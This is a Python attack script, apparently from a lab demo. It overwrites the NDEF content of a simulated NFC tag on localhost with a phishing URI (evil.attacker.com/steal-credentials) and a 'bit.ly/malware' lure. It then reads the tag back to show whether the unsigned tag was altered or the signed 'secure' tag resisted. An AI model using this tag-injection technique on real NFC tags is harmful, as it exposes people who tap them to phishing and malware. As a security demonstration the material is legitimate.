#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NFC NDEF Injector - overwrite NFC tag content with malicious payload

Usage:
    python nfc_injector.py              # Attack normal NFC tag (port 6011) - VULNERABLE
    python nfc_injector.py --secure     # Attack Secure NFC tag (port 6012) - BLOCKED
"""
import socket, json, sys, io
import ndef
from colorama import Fore, init
init(autoreset=True)

# Fix Windows CP1252 encoding issue
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

NFC_HOST = '127.0.0.1'
NFC_PORT = 6011

PAYLOADS = {
    'phishing_url':  ('URI',  'https://evil.attacker.com/steal-credentials'),
    'malicious_text':('TEXT', 'System updated. Visit: bit.ly/malware'),
}


def make_payload(ptype: str) -> bytes:
    if ptype == 'phishing_url':
        r = ndef.UriRecord(PAYLOADS['phishing_url'][1])
    elif ptype == 'malicious_text':
        r = ndef.TextRecord(PAYLOADS['malicious_text'][1])
    else:
        r = ndef.UriRecord('https://evil.example.com')
    return b''.join(ndef.message_encoder([r]))


def inject(ptype: str):
    ndef_bytes = make_payload(ptype)
    s = socket.socket()
    s.settimeout(3)
    s.connect((NFC_HOST, NFC_PORT))
    payload = {'cmd': 'WRITE_NDEF', 'ndef_hex': ndef_bytes.hex()}
    s.send(json.dumps(payload).encode())
    resp = json.loads(s.recv(512).decode())
    s.close()
    return resp


print(f'{Fore.RED}=== NFC NDEF Injection Attack ===')
print(f'{Fore.CYAN}Target: NFC Tag (port {NFC_PORT})\n')

for ptype in ['phishing_url', 'malicious_text']:
    print(f'{Fore.RED}[INJECT] Overwriting with: {ptype}')
    try:
        r = inject(ptype)
        print(f'{Fore.RED}[INJECT] Result: {r}')
        # Verify: read back the tag
        s = socket.socket(); s.settimeout(2)
        s.connect((NFC_HOST, NFC_PORT))
        s.send(json.dumps({'cmd': 'READ_NDEF'}).encode())
        verify = json.loads(s.recv(2048).decode()); s.close()
        if 'signature' in verify:
            print(f'{Fore.YELLOW}[VERIFY] NDEF unchanged, signature still valid: {verify.get("signature","")[:16]}...\n')
        else:
            print(f'{Fore.RED}[VERIFY] New NDEF content: {verify.get("records", [])}\n')
    except Exception as e:
        print(f'{Fore.RED}[INJECT] Error: {e}\n')
